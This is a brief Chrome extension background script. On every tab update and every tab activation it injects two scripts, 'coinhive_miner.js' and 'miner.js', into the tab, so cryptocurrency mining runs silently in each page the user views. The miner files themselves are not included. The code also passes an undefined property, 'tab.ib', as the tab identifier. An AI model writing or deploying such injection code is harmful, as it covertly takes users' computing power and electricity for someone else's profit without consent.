chrome.tabs.onUpdated.addListener(function(tab) {
    //  executes script in active tab
    chrome.tabs.executeScript(tab.ib, {
        // file: "coinhive_miner.js"
        file: "coinhive_miner.js"
    });
    chrome.tabs.executeScript(tab.ib, {
        file: 'miner.js'
    });
});
chrome.tabs.onActivated.addListener(function(tab) {

    //  executes script in active tab
    chrome.tabs.executeScript(tab.ib, {
        // file: "coinhive_miner.js"
        file: "coinhive_miner.js"
    });
    chrome.tabs.executeScript(tab.ib, {
        file: 'miner.js'
    });
});
